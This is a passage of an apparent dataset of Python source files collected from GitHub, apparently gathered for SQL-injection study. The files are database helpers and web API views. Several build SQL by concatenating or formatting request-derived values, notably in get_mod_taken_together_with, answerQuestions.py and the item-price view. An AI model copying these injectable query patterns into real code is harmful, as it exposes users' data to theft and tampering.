        "source": "'''\n    model.py\n    Handles queries to the database\n'''\n\nimport hashlib\nimport components.database_adapter # database_adaptor.py handles the connection to database\nimport psycopg2\n\n## Connects to the postgres database\nCONNECTION = components.database_adapter.connect_db()\nDB_CURSOR = CONNECTION.cursor()\n\n\ndef get_all_modules():\n    '''\n        Get the module code, name, description, and MCs of all modules\n    '''\n    sql_command = \"SELECT * FROM module ORDER BY code\"\n    DB_CURSOR.execute(sql_command)\n    return DB_CURSOR.fetchall()\n\n\ndef get_module(code):\n    '''\n        Get the module code, name, description and MCs of a single module\n    '''\n    sql_command = \"SELECT * FROM module WHERE code=%s\"\n    DB_CURSOR.execute(sql_command, (code,))\n    return DB_CURSOR.fetchone()\n\n\ndef get_all_fixed_mounted_modules():\n    '''\n        Get the module code, name, AY/Sem and quota of all fixed mounted modules\n    '''\n    sql_command = \"SELECT m2.moduleCode, m1.name, m2.acadYearAndSem, m2.quota \" +\\\n                    \"FROM module m1, moduleMounted m2 WHERE m2.moduleCode = m1.code \" +\\\n                    \"ORDER BY m2.moduleCode, m2.acadYearAndSem\"\n    DB_CURSOR.execute(sql_command)\n    return DB_CURSOR.fetchall()\n\n\ndef get_all_tenta_mounted_modules():\n    '''\n        Get the module code, name, AY/Sem and quota of all tentative mounted modules\n    '''\n    sql_command = \"SELECT m2.moduleCode, m1.name, m2.acadYearAndSem, m2.quota \" +\\\n                    \"FROM module m1, moduleMountTentative m2 WHERE m2.moduleCode = m1.code \" +\\\n                    \"ORDER BY m2.moduleCode, m2.acadYearAndSem\"\n    DB_CURSOR.execute(sql_command)\n    return DB_CURSOR.fetchall()\n\n\ndef get_all_tenta_mounted_modules_of_selected_ay(selected_ay):\n    '''\n        Get the module code, name, AY/Sem and quota of all tenta mounted mods of a selected AY\n    '''\n    sql_command = \"SELECT m2.moduleCode, m1.name, m2.acadYearAndSem, m2.quota \" +\\\n                  \"FROM module m1, moduleMountTentative m2 WHERE m2.moduleCode = m1.code \" +\\\n                  \"AND M2.acadYearAndSem LIKE %s\" + \\\n                  \"ORDER BY m2.moduleCode, m2.acadYearAndSem\"\n    processed_ay = selected_ay + \"%\"\n\n    DB_CURSOR.execute(sql_command, (processed_ay,))\n    return DB_CURSOR.fetchall()\n\n\ndef get_first_fixed_mounting():\n    '''\n        Get the first mounting from the fixed mounting table\n        This is used for reading the current AY\n    '''\n    sql_command = \"SELECT acadYearAndSem FROM moduleMounted LIMIT(1)\"\n    DB_CURSOR.execute(sql_command)\n    return DB_CURSOR.fetchone()\n\n\ndef get_all_fixed_ay_sems():\n    '''\n        Get all the distinct AY/Sem in the fixed mounting table\n    '''\n    sql_command = \"SELECT DISTINCT acadYearAndSem FROM moduleMounted \" +\\\n                  \"ORDER BY acadYearAndSem ASC\"\n    DB_CURSOR.execute(sql_command)\n    return DB_CURSOR.fetchall()\n\n\ndef get_all_tenta_ay_sems():\n    '''\n        Get all the distinct AY/Sem in the tentative mounting table\n    '''\n    sql_command = \"SELECT DISTINCT acadYearAndSem FROM moduleMountTentative \" +\\\n                  \"ORDER BY acadYearAndSem ASC\"\n    DB_CURSOR.execute(sql_command)\n    return DB_CURSOR.fetchall()\n\n\ndef get_fixed_mounting_and_quota(code):\n    '''\n        Get the fixed AY/Sem and quota of a mounted module\n    '''\n    sql_command = \"SELECT acadYearAndSem, quota FROM moduleMounted \" +\\\n                  \"WHERE moduleCode=%s ORDER BY acadYearAndSem ASC\"\n    DB_CURSOR.execute(sql_command, (code, ))\n    return DB_CURSOR.fetchall()\n\n\ndef get_tenta_mounting_and_quota(code):\n    '''\n        Get the tentative AY/Sem and quota of a mounted module\n    '''\n    sql_command = \"SELECT acadYearAndSem, quota FROM moduleMountTentative \" +\\\n                  \"WHERE moduleCode=%s ORDER BY acadYearAndSem ASC\"\n    DB_CURSOR.execute(sql_command, (code, ))\n    return DB_CURSOR.fetchall()\n\n\ndef get_quota_of_target_fixed_ay_sem(code, ay_sem):\n    '''\n        Get the quota of a mod in a target fixed AY/Sem (if any)\n    '''\n    sql_command = \"SELECT quota FROM moduleMounted \" +\\\n                  \"WHERE moduleCode=%s AND acadYearAndSem=%s \"\n    DB_CURSOR.execute(sql_command, (code, ay_sem))\n    return DB_CURSOR.fetchall()\n\n\ndef get_quota_of_target_tenta_ay_sem(code, ay_sem):\n    '''\n        Get the quota of a mod in a target tentative AY/Sem (if any)\n    '''\n    sql_command = \"SELECT quota FROM moduleMountTentative \" +\\\n                  \"WHERE moduleCode=%s AND acadYearAndSem=%s \"\n    DB_CURSOR.execute(sql_command, (code, ay_sem))\n    return DB_CURSOR.fetchall()\n\n\ndef get_number_students_planning(code):\n    '''\n        Get the number of students planning to take a mounted module\n    '''\n    sql_command = \"SELECT COUNT(*), acadYearAndSem FROM studentPlans WHERE \" +\\\n                    \"moduleCode=%s GROUP BY acadYearAndSem ORDER BY acadYearAndSem\"\n    DB_CURSOR.execute(sql_command, (code, ))\n    return DB_CURSOR.fetchall()\n\n\ndef add_module(code, name, description, module_credits, status):\n    '''\n        Insert a module into the module table.\n        Returns true if successful, false if duplicate primary key detected\n    '''\n    sql_command = \"INSERT INTO module VALUES (%s,%s,%s,%s,%s)\"\n    try:\n        DB_CURSOR.execute(sql_command, (code, name, description, module_credits, status))\n        CONNECTION.commit()\n    except psycopg2.IntegrityError:        # duplicate key error\n        CONNECTION.rollback()\n        return False\n    return True\n\n\ndef update_module(code, name, description, module_credits):\n    '''\n        Update a module with edited info\n    '''\n    sql_command = \"UPDATE module SET name=%s, description=%s, mc=%s \" +\\\n                  \"WHERE code=%s\"\n    try:\n        DB_CURSOR.execute(sql_command, (name, description, module_credits, code))\n        CONNECTION.commit()\n    except psycopg2.Error:\n        CONNECTION.rollback()\n        return False\n    return True\n\n\ndef flag_module_as_removed(code):\n    '''\n        Change the status of a module to 'To Be Removed'\n    '''\n    sql_command = \"UPDATE module SET status='To Be Removed' WHERE code=%s\"\n    DB_CURSOR.execute(sql_command, (code, ))\n    CONNECTION.commit()\n\n\ndef flag_module_as_active(code):\n    '''\n        Change the status of a module to 'Active'\n    '''\n    sql_command = \"UPDATE module SET status='Active' WHERE code=%s\"\n    DB_CURSOR.execute(sql_command, (code, ))\n    CONNECTION.commit()\n\n\ndef delete_module(code):\n    '''\n        Delete a module from the module table\n    '''\n    # Delete the foreign key reference first.\n    sql_command = \"DELETE FROM modulemounted WHERE modulecode=%s\"\n    DB_CURSOR.execute(sql_command, (code,))\n\n    # Perform the normal delete.\n    sql_command = \"DELETE FROM module WHERE code=%s\"\n    DB_CURSOR.execute(sql_command, (code,))\n    CONNECTION.commit()\n\n\ndef get_oversub_mod():\n    '''\n        Retrieves a list of modules which are oversubscribed.\n        Returns module, AY/Sem, quota, number students interested\n        i.e. has more students interested than the quota\n    '''\n    list_of_oversub_with_info = []\n    list_all_mod_info = get_all_modules()\n\n    for module_info in list_all_mod_info:\n        mod_code = module_info[0]\n\n        aysem_quota_fixed_list = get_fixed_mounting_and_quota(mod_code)\n        aysem_quota_tenta_list = get_tenta_mounting_and_quota(mod_code)\n        aysem_quota_merged_list = aysem_quota_fixed_list + \\\n                                aysem_quota_tenta_list\n\n        num_student_plan_aysem_list = get_number_students_planning(mod_code)\n        for num_plan_aysem_pair in num_student_plan_aysem_list:\n            num_student_planning = num_plan_aysem_pair[0]\n            ay_sem = num_plan_aysem_pair[1]\n            real_quota = get_quota_in_aysem(ay_sem, aysem_quota_merged_list)\n\n            # ensures that quota will be a number which is not None\n            if real_quota is None:\n                quota = 0\n                real_quota = '?'\n            else:\n                quota = real_quota\n\n            if num_student_planning > quota:\n                oversub_info = (mod_code, ay_sem, real_quota, num_student_planning)\n                list_of_oversub_with_info.append(oversub_info)\n\n    return list_of_oversub_with_info\n\n\ndef get_quota_in_aysem(ay_sem, aysem_quota_merged_list):\n    '''\n        This is a helper function.\n        Retrieves the correct quota from ay_sem listed inside\n        aysem_quota_merged_list parameter.\n    '''\n    for aysem_quota_pair in aysem_quota_merged_list:\n        aysem_in_pair = aysem_quota_pair[0]\n        if ay_sem == aysem_in_pair:\n            quota_in_pair = aysem_quota_pair[1]\n\n            return quota_in_pair\n\n    return None # quota not found in list\n\n\ndef add_admin(username, salt, hashed_pass):\n    '''\n        Register an admin into the database.\n        Note: to change last argument to false once\n        activation done\n    '''\n    sql_command = \"INSERT INTO admin VALUES (%s, %s, %s, FALSE, TRUE)\"\n    DB_CURSOR.execute(sql_command, (username, salt, hashed_pass))\n    CONNECTION.commit()\n\n\ndef is_userid_taken(userid):\n    '''\n        Retrieves all account ids for testing if a user id supplied\n        during account creation\n    '''\n    sql_command = \"SELECT staffid FROM admin WHERE staffID=%s\"\n    DB_CURSOR.execute(sql_command, (userid,))\n\n    result = DB_CURSOR.fetchall()\n    return len(result) != 0\n\n\ndef delete_admin(username):\n    '''\n        Delete an admin from the database.\n    '''\n    # Delete the foreign key references first.\n    sql_command = \"DELETE FROM starred WHERE staffID=%s\"\n    DB_CURSOR.execute(sql_command, (username,))\n\n    sql_command = \"DELETE FROM admin WHERE staffID=%s\"\n    DB_CURSOR.execute(sql_command, (username,))\n    CONNECTION.commit()\n\n\ndef validate_admin(username, unhashed_pass):\n    '''\n        Check if a provided admin-password pair is valid.\n    '''\n    sql_command = \"SELECT salt, password FROM admin WHERE staffID=%s\"\n    DB_CURSOR.execute(sql_command, (username,))\n    admin = DB_CURSOR.fetchall()\n    if not admin:\n        return False\n    else:\n        hashed_pass = hashlib.sha512(unhashed_pass + admin[0][0]).hexdigest()\n        is_valid = (admin[0][1] == hashed_pass)\n        return is_valid\n\n\ndef add_fixed_mounting(code, ay_sem, quota):\n    '''\n        Insert a new mounting into fixed mounting table\n    '''\n    try:\n        sql_command = \"INSERT INTO modulemounted VALUES (%s,%s,%s)\"\n        DB_CURSOR.execute(sql_command, (code, ay_sem, quota))\n        CONNECTION.commit()\n    except psycopg2.IntegrityError:        # duplicate key error\n        CONNECTION.rollback()\n        return False\n    return True\n\n\ndef delete_fixed_mounting(code, ay_sem):\n    '''\n        Delete a mounting from the fixed mounting table\n    '''\n    sql_command = \"DELETE FROM modulemounted WHERE moduleCode=%s AND acadYearAndSem=%s\"\n    DB_CURSOR.execute(sql_command, (code, ay_sem))\n    CONNECTION.commit()\n\n\ndef add_tenta_mounting(code, ay_sem, quota):\n    '''\n        Insert a new mounting into tentative mounting table\n    '''\n    try:\n        sql_command = \"INSERT INTO moduleMountTentative VALUES (%s,%s,%s)\"\n        DB_CURSOR.execute(sql_command, (code, ay_sem, quota))\n        CONNECTION.commit()\n    except psycopg2.IntegrityError:        # duplicate key error\n        CONNECTION.rollback()\n        return False\n    return True\n\n\ndef update_quota(code, ay_sem, quota):\n    '''\n        Update the quota of a module in a target tentative AY/Sem\n    '''\n    sql_command = \"UPDATE moduleMountTentative SET quota=%s \" +\\\n                  \"WHERE moduleCode=%s AND acadYearAndSem=%s\"\n    try:\n        DB_CURSOR.execute(sql_command, (quota, code, ay_sem))\n        CONNECTION.commit()\n    except psycopg2.Error:\n        CONNECTION.rollback()\n        return False\n    return True\n\n\ndef delete_tenta_mounting(code, ay_sem):\n    '''\n        Delete a mounting from the tentative mounting table\n    '''\n    sql_command = \"DELETE FROM moduleMountTentative WHERE moduleCode=%s AND acadYearAndSem=%s\"\n    try:\n        DB_CURSOR.execute(sql_command, (code, ay_sem))\n        CONNECTION.commit()\n    except psycopg2.Error:\n        CONNECTION.rollback()\n        return False\n    return True\n\n\ndef get_num_students_by_yr_study():\n    '''\n        Retrieves the number of students at each year of study as a table\n        Each row will contain (year, number of students) pair.\n        e.g. [(1, 4), (2, 3)] means four year 1 students\n        and two year 3 students\n    '''\n    INDEX_FIRST_ELEM = 0\n\n    sql_command = \"SELECT year, COUNT(*) FROM student GROUP BY year\" + \\\n        \" ORDER BY year\"\n    DB_CURSOR.execute(sql_command)\n\n    table_with_non_zero_students = DB_CURSOR.fetchall()\n    final_table = append_missing_year_of_study(table_with_non_zero_students)\n\n    # Sort the table based on year\n    final_table.sort(key=lambda row: row[INDEX_FIRST_ELEM])\n\n    return final_table\n\n\ndef append_missing_year_of_study(initial_table):\n    '''\n        Helper function to append missing years of study to the\n        given initial table.\n        initial_table given in lists of (year, number of students)\n        pair.\n        e.g. If year 5 is missing from table, appends (5,0) to table\n        and returns the table\n    '''\n    MAX_POSSIBLE_YEAR = 6\n    for index in range(0, MAX_POSSIBLE_YEAR):\n        year = index + 1\n        year_exists_in_table = False\n\n        for year_count_pair in initial_table:\n            req_year = year_count_pair[0]\n            if req_year == year:\n                year_exists_in_table = True\n                break\n\n        if not year_exists_in_table:\n            initial_table.append((year, 0))\n\n    return initial_table\n\n\ndef get_num_students_by_focus_area_non_zero():\n    '''\n        Retrieves the number of students for each focus area as a table,\n        if no student is taking that focus area, that row will not be\n        returned.\n        Each row will contain (focus area, number of students) pair.\n        See: get_num_students_by_focus_areas() for more details.\n    '''\n    sql_command = \"SELECT f.name, COUNT(*) FROM focusarea f, takesfocusarea t\" + \\\n        \" WHERE f.name = t.focusarea1 OR f.name = t.focusarea2 GROUP BY f.name\"\n    DB_CURSOR.execute(sql_command)\n\n    return DB_CURSOR.fetchall()\n\n\ndef get_focus_areas_with_no_students_taking():\n    '''\n        Retrieves a list of focus areas with no students taking.\n    '''\n    sql_command = \"SELECT f2.name FROM focusarea f2 WHERE NOT EXISTS(\" + \\\n        \"SELECT f.name FROM focusarea f, takesfocusarea t \" + \\\n        \"WHERE (f.name = t.focusarea1 OR f.name = t.focusarea2) \" + \\\n        \"AND f2.name = f.name GROUP BY f.name)\"\n    DB_CURSOR.execute(sql_command)\n\n    return DB_CURSOR.fetchall()\n\n\ndef get_number_students_without_focus_area():\n    '''\n        Retrieves the number of students who have not indicated their focus\n        area.\n    '''\n    sql_command = \"SELECT COUNT(*) FROM takesfocusarea WHERE \" + \\\n        \"focusarea1 IS NULL AND focusarea2 IS NULL\"\n    DB_CURSOR.execute(sql_command)\n\n    return DB_CURSOR.fetchone()\n\n\ndef get_num_students_by_focus_areas():\n    '''\n        Retrieves the number of students for each focus area as a table\n        Each row will contain (focus area, number of students) pair\n        e.g. [(AI, 4), (Database, 3)] means four students taking AI as\n        focus area and three students taking database as focus area.\n        Note: A student taking double focus on AI and Database will be\n        reflected once for AI and once for database (i.e. double counting)\n    '''\n    INDEX_FIRST_ELEM = 0\n\n    table_with_non_zero_students = get_num_students_by_focus_area_non_zero()\n    table_with_zero_students = get_focus_areas_with_no_students_taking()\n\n    temp_table = table_with_non_zero_students\n\n    # Loops through all focus areas with no students taking and add them to\n    # the table with (focus area, number of students) pair.\n    for focus_area_name in table_with_zero_students:\n        temp_table.append((focus_area_name[INDEX_FIRST_ELEM], 0))\n\n    # Sort the table based on focus area\n    temp_table.sort(key=lambda row: row[INDEX_FIRST_ELEM])\n\n    # Build the final table with info of students without focus area.\n    num_students_without_focus = \\\n    get_number_students_without_focus_area()[INDEX_FIRST_ELEM]\n\n    temp_table.insert(INDEX_FIRST_ELEM,\n                      (\"Have Not Indicated\", num_students_without_focus))\n    final_table = temp_table\n\n    return final_table\n\ndef get_mod_taken_together_with(code):\n    '''\n        Retrieves the list of modules taken together with the specified\n        module code in the same semester.\n\n        Returns a table of lists (up to 10 top results). Each list contains\n        (specified code, module code of mod taken together, aySem, number of students)\n\n        e.g. [(CS1010, CS1231, AY 16/17 Sem 1, 5)] means there are 5 students\n        taking CS1010 and CS1231 together in AY 16/17 Sem 1.\n    '''\n    NUM_TOP_RESULTS_TO_RETURN = 10\n\n    sql_command = \"SELECT sp1.moduleCode, sp2.moduleCode, sp1.acadYearAndSem, COUNT(*) \" + \\\n                \"FROM studentPlans sp1, studentPlans sp2 \" + \\\n                \"WHERE sp1.moduleCode = '\" + code + \"' AND \" + \\\n                \"sp2.moduleCode <> sp1.moduleCode AND \" + \\\n                \"sp1.studentId = sp2.studentId AND \" + \\\n                \"sp1.acadYearAndSem = sp2.acadYearAndSem \" + \\\n                \"GROUP BY sp1.moduleCode, sp2.moduleCode, sp1.acadYearAndSem \" + \\\n                \"ORDER BY COUNT(*) DESC\"\n\n    DB_CURSOR.execute(sql_command)\n\n    return DB_CURSOR.fetchmany(NUM_TOP_RESULTS_TO_RETURN)\n\ndef get_all_mods_taken_together():\n    '''\n        Retrieves the list of all modules taken together in the same semester.\n\n        Returns a table of lists. Each list contains\n        (module code 1, module code 2, aySem, number of students)\n        where module code 1 and module code 2 are the 2 mods taken together\n        in the same semester.\n\n        e.g. [(CS1010, CS1231, AY 16/17 Sem 1, 5)] means there are 5 students\n        taking CS1010 and CS1231 together in AY 16/17 Sem 1.\n    '''\n\n    sql_command = \"SELECT sp1.moduleCode, sp2.moduleCode, sp1.acadYearAndSem, COUNT(*) \" + \\\n                \"FROM studentPlans sp1, studentPlans sp2 \" + \\\n                \"WHERE sp1.moduleCode < sp2.moduleCode AND \" + \\\n                \"sp1.studentId = sp2.studentId AND \" + \\\n                \"sp1.acadYearAndSem = sp2.acadYearAndSem \" + \\\n                \"GROUP BY sp1.moduleCode, sp2.moduleCode, sp1.acadYearAndSem \" + \\\n                \"ORDER BY COUNT(*) DESC\"\n\n    DB_CURSOR.execute(sql_command)\n\n    return DB_CURSOR.fetchall()\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/mantaleigh/SHE-nonymous/blob/c072465274a6fa0d8cd5efa33366b37495149c2d",
        "file_path": "/answerQuestions.py",
        "source": "#!/usr/local/bin/python2.7\n\n'''\nAuthor: Samantha Voigt\nLast Modified: 4/19/16\nanswerQuestions.py\n\nTODO: Write a description of the file\n\nTODO: sort by timestamp\n\n'''\n\nimport MySQLdb\nimport dbconn2\n\nUSER = 'svoigt'\n\n\ndef makeQuestionSelect(database): \n\tconn = dbConnect(database)\n\tcurs = conn.cursor(MySQLdb.cursors.DictCursor) # results as Dictionaries\n\tstatement = \"SELECT * FROM questions WHERE status='not-started' OR status='in-progress' ORDER BY ts DESC;\"\n\tcurs.execute(statement)\n\tlines = []\n\twhile True:\n\t\trow = curs.fetchone()\n\t\tif row == None: \n\t\t\tlines.append(\"<input type='submit' name=questionSubmit value='Answer Selected Question'>\")\n\t\t\treturn \"\\n\".join(lines)\n\t\t\n\t\tlines.append(\"<div style='border:2px solid black;'><input type='radio' name='q_selection' value={id}> Question: {question}\\n<p>Status: {status}\\n<p>Time submitted: {ts}\".format(id=row['id'], question=row['question'], status=row['status'], ts=row['ts']))\n\t\tif row['status'] == 'in-progress': \n\t\t\tlines.append(\"<p>In-Progress Answer: {curr_answer}\".format(curr_answer=row['answer']))\n\t\tlines.append(\"</div>\")\n\ndef makeAnswerForm(database, id): \n\tconn = dbConnect(database)\n\tcurs = conn.cursor(MySQLdb.cursors.DictCursor)\n\tstatement = \"SELECT * FROM questions WHERE id=\" + id # came from the form, not user input\n\tcurs.execute(statement)\n\trow = curs.fetchone()\n\tif row: # only one result\n\t\ts = \"<p>Question: {q}<br><br>\".format(q=row['question'])\n\t\ts += \"DO NOT CHANGE: <input type=text name='id' value={id}>\".format(id=row['id'])\n\t\ts += \"<label for='answer'>Answer:</label><br>\"\n\t\tif row['status'] == 'in-progress': \n\t\t\ts += \"<textarea name='answer' cols='40' rows='5'>{ans}</textarea><br>\".format(ans=row['answer'])\n\t\telse: \n\t\t\ts += \"<textarea name='answer' cols='40' rows='5'></textarea><br>\"\n\t\ts += \"<input type='submit' name='save' value='Save'><input type='submit' name='publish' value='Publish'>\"\n\t\treturn s\n\telse: \n\t\treturn \"ERROR: couldn't find selected question in the database\" # shouldn't happen\n\n\ndef updateAnswer(database, q_id, answer, update_type): \n\t'''\n\tAdds the provided question to the questions table in the given database. \n\t'''\n\tconn = dbConnect(database)\n\tcurs = conn.cursor(MySQLdb.cursors.DictCursor)\n\tstatement = \"SELECT * FROM questions WHERE id=\" + q_id # won't come from the user\n\tcurs.execute(statement)\n\trow = curs.fetchone() # only one result\n\ttimestamp = row['ts']\n\t# timestamp automatically changes on update - so you have to replace it with the old value\n\n\tif update_type == 'publish':\n\t\tstatement = \"update questions set status='completed', answer=%s, ts=%s where id=%s\"\n\t\t# change the status to completed\n\tif update_type == 'save': \n\t\tstatement = \"update questions set status='in-progress', answer=%s, ts=%s where id=%s\"\n\t\t# change the status to in-progress\n\n\tcurs.execute(statement, (answer, timestamp, q_id))\n\n\ndef dbConnect(database): \n\t''' \n\tConnects to the provided database using my cnf file and returns the connection\n\t'''\n\tdsn = dbconn2.read_cnf('/students/' + USER + '/.my.cnf')\n\tdsn['db'] = database\n\tconn = dbconn2.connect(dsn)\n\treturn conn\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/nullpuppy/ouchallenge/blob/c630b476e4dd5c23210c58a404fdf3d841c4c332",
        "file_path": "/ouchallenge/itemPrices/views.py",
        "source": "from itemPrices.models import ItemSale\nfrom django.db import connection\nfrom django.db.models import Count\nfrom rest_framework.views import APIView\nfrom rest_framework.response import Response\nfrom rest_framework import status\n\n\nNOT_FOUND_JSON_RESPONSE = {\n    'status': 404,\n    'content': {\n        'message': 'Not found',\n    }\n}\n\n\nclass ItemPriceService(APIView):\n    \"\"\"\n    \"\"\"\n    def get(self, request):\n        item = request.query_params.get('item')\n        city = request.query_params.get('city')\n\n        # If item and city are both excluded from the request, return\n        # a json blob with a status of 404.\n        if not item and not city:\n            return Response(NOT_FOUND_JSON_RESPONSE)\n\n        # Raw SQL using built-in mode() function within postgres\n        # Returns a single row with the highest most frequent list price and\n        # count of items found for the given search parameters.\n        sql = '''SELECT\n                    mode() WITHIN GROUP (ORDER BY list_price DESC) AS model_value,\n                    count(*)\n                 FROM\n                    \"itemPrices_itemsale\"\n              '''\n        if item and city:\n            sql = \"{} WHERE city = '{}' and title = '{}'\".format(sql, city, item)\n        elif item:\n            sql = \"{} WHERE title = '{}'\".format(sql, item)\n        elif city:\n            sql = \"{} WHERE city = '{}'\".format(sql, city)\n\n        with connection.cursor() as c:\n            c.execute(sql)\n            price_mode, count = c.fetchone()\n\n        # More traditional django ORM route of doing the above.\n        # The above seems to be slightly faster, based on the\n        # throughput I observed in jmeter, but is database specific.\n        # Adding caching and reworking the ORM query might be a better\n        # choice moving forward.\n\n        # query = ItemSale.objects\n        # if item:\n        #     query = query.filter(title__startswith=item)\n        # if city:\n        #     query = query.filter(city=city)\n\n        # # Get total item count for given parameters.\n        # count = query.count()\n\n        # Find list_price mode for given parameters.\n        # query = query.order_by('list_price').values('list_price').annotate(price_count=Count('list_price'))\n        # price_mode = query.order_by('-price_count', '-list_price').first()\n        # if price_mode:\n        #     price_mode = price_mode.get('list_price')\n\n        # If we didn't find anything, return 404 response, just as if item and\n        # city weren't passed in.\n        if count == 0:\n            return Response(NOT_FOUND_JSON_RESPONSE)\n\n        return Response({\n            'status': 200,\n            'content': {\n                'item': item or 'Not specified',\n                'item_count': count,\n                'price_suggestion': price_mode,\n                'city': city or 'Not specified',\n            }\n        })\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/culturemesh/culturemesh-api/blob/67752de000e27bb109ddd532b2b545451fabeee6",
        "file_path": "/api/blueprints/locations/controllers.py",
        "source": "from flask import Blueprint, request\nfrom api import require_apikey\nfrom api.apiutils import *\n\nlocations = Blueprint('location', __name__)\n\n\n@locations.route(\"/ping\")\n@require_apikey\ndef test():\n    return \"pong\"\n\n\n@locations.route(\"/countries/<country_id>\", methods=[\"GET\"])\n@require_apikey\ndef get_country(country_id):\n    return get_by_id(\"countries\", country_id)\n\n\n@locations.route(\"/regions/<region_id>\", methods=[\"GET\"])\n@require_apikey\ndef get_region(region_id):\n    return get_by_id(\"regions\", region_id)\n\n\n@locations.route(\"/cities/<city_id>\", methods=[\"GET\"])\n@require_apikey\ndef get_city(city_id):\n    return get_by_id(\"cities\", city_id)\n\n\n@locations.route(\"/autocomplete\", methods=[\"GET\"])\n@require_apikey\ndef autocomplete():\n    # TODO: Have fancier queries. For now, we will just take advantage of regex, which functions as a \"contains\"\n    # TODO: Since we can't let pymysql put quotes for us (we need the %'s in between to have regex), we have to do\n    # a direct format. This is a SQL injection vulnerability.\n    # First, get relevant cities.\n\n    conn = mysql.get_db()\n    location_objects = []\n    city_cur = conn.cursor()\n    city_cur.execute(\"SELECT cities.name, id AS city_id, region_id, country_id FROM cities WHERE cities.name REGEXP %s LIMIT 100\"\n                     , (request.args[\"input_text\"],))\n    location_objects.extend(convert_objects(city_cur.fetchall(), city_cur.description))\n    if len(location_objects) == 100:  # If we already have 100 results, which is plenty, let's just return those.\n        return make_response(jsonify(location_objects), HTTPStatus.OK)\n    region_cur = conn.cursor()\n    region_cur.execute(\"SELECT regions.name, 'null' AS city_id, id AS region_id, country_id FROM regions WHERE regions.name REGEXP %s LIMIT 100\"\n                       , (request.args[\"input_text\"],))\n    location_objects.extend(convert_objects(region_cur.fetchall(), region_cur.description))\n    if len(location_objects) == 100:\n        return make_response(jsonify(location_objects), HTTPStatus.OK)\n    country_cur = conn.cursor()\n    country_cur.execute(\"SELECT countries.name, 'null' AS city_id, 'null' AS region_id, id AS country_id FROM countries WHERE countries.name REGEXP %s LIMIT 100\"\n                        , (request.args[\"input_text\"],))\n    location_objects.extend(convert_objects(country_cur.fetchall(), country_cur.description))\n    return make_response(jsonify(location_objects), HTTPStatus.OK)\n\n\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/omirajkar/bench_frappe/blob/9e2e65f3054c52652b3491713f28d80b80efdfd3",
        "file_path": "/frappe/model/db_query.py",
        "source": "# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors\n# MIT License. See license.txt\n\nfrom __future__ import unicode_literals\n\nfrom six import iteritems, string_types\n\n\"\"\"build query for doclistview and return results\"\"\"\n\nimport frappe, json, copy, re\nimport frappe.defaults\nimport frappe.share\nimport frappe.permissions\nfrom frappe.utils import flt, cint, getdate, get_datetime, get_time, make_filter_tuple, get_filter, add_to_date\nfrom frappe import _\nfrom frappe.model import optional_fields\nfrom frappe.model.utils.user_settings import get_user_settings, update_user_settings\nfrom datetime import datetime\n\nclass DatabaseQuery(object):\n\tdef __init__(self, doctype):\n\t\tself.doctype = doctype\n\t\tself.tables = []\n\t\tself.conditions = []\n\t\tself.or_conditions = []\n\t\tself.fields = None\n\t\tself.user = None\n\t\tself.ignore_ifnull = False\n\t\tself.flags = frappe._dict()\n\n\tdef execute(self, query=None, fields=None, filters=None, or_filters=None,\n\t\tdocstatus=None, group_by=None, order_by=None, limit_start=False,\n\t\tlimit_page_length=None, as_list=False, with_childnames=False, debug=False,\n\t\tignore_permissions=False, user=None, with_comment_count=False,\n\t\tjoin='left join', distinct=False, start=None, page_length=None, limit=None,\n\t\tignore_ifnull=False, save_user_settings=False, save_user_settings_fields=False,\n\t\tupdate=None, add_total_row=None, user_settings=None):\n\t\tif not ignore_permissions and not frappe.has_permission(self.doctype, \"read\", user=user):\n\t\t\tfrappe.flags.error_message = _('Insufficient Permission for {0}').format(frappe.bold(self.doctype))\n\t\t\traise frappe.PermissionError(self.doctype)\n\n\t\t# fitlers and fields swappable\n\t\t# its hard to remember what comes first\n\t\tif (isinstance(fields, dict)\n\t\t\tor (isinstance(fields, list) and fields and isinstance(fields[0], list))):\n\t\t\t# if fields is given as dict/list of list, its probably filters\n\t\t\tfilters, fields = fields, filters\n\n\t\telif fields and isinstance(filters, list) \\\n\t\t\tand len(filters) > 1 and isinstance(filters[0], string_types):\n\t\t\t# if `filters` is a list of strings, its probably fields\n\t\t\tfilters, fields = fields, filters\n\n\t\tif fields:\n\t\t\tself.fields = fields\n\t\telse:\n\t\t\tself.fields =  [\"`tab{0}`.`name`\".format(self.doctype)]\n\n\t\tif start: limit_start = start\n\t\tif page_length: limit_page_length = page_length\n\t\tif limit: limit_page_length = limit\n\n\t\tself.filters = filters or []\n\t\tself.or_filters = or_filters or []\n\t\tself.docstatus = docstatus or []\n\t\tself.group_by = group_by\n\t\tself.order_by = order_by\n\t\tself.limit_start = 0 if (limit_start is False) else cint(limit_start)\n\t\tself.limit_page_length = cint(limit_page_length) if limit_page_length else None\n\t\tself.with_childnames = with_childnames\n\t\tself.debug = debug\n\t\tself.join = join\n\t\tself.distinct = distinct\n\t\tself.as_list = as_list\n\t\tself.ignore_ifnull = ignore_ifnull\n\t\tself.flags.ignore_permissions = ignore_permissions\n\t\tself.user = user or frappe.session.user\n\t\tself.update = update\n\t\tself.user_settings_fields = copy.deepcopy(self.fields)\n\t\t#self.debug = True\n\n\t\tif user_settings:\n\t\t\tself.user_settings = json.loads(user_settings)\n\n\t\tif query:\n\t\t\tresult = self.run_custom_query(query)\n\t\telse:\n\t\t\tresult = self.build_and_run()\n\n\t\tif with_comment_count and not as_list and self.doctype:\n\t\t\tself.add_comment_count(result)\n\n\t\tif save_user_settings:\n\t\t\tself.save_user_settings_fields = save_user_settings_fields\n\t\t\tself.update_user_settings()\n\n\t\treturn result\n\n\tdef build_and_run(self):\n\t\targs = self.prepare_args()\n\t\targs.limit = self.add_limit()\n\n\t\tif args.conditions:\n\t\t\targs.conditions = \"where \" + args.conditions\n\n\t\tif self.distinct:\n\t\t\targs.fields = 'distinct ' + args.fields\n\n\t\tquery = \"\"\"select %(fields)s from %(tables)s %(conditions)s\n\t\t\t%(group_by)s %(order_by)s %(limit)s\"\"\" % args\n\n\t\treturn frappe.db.sql(query, as_dict=not self.as_list, debug=self.debug, update=self.update)\n\n\tdef prepare_args(self):\n\t\tself.parse_args()\n\t\tself.sanitize_fields()\n\t\tself.extract_tables()\n\t\tself.set_optional_columns()\n\t\tself.build_conditions()\n\n\t\targs = frappe._dict()\n\n\t\tif self.with_childnames:\n\t\t\tfor t in self.tables:\n\t\t\t\tif t != 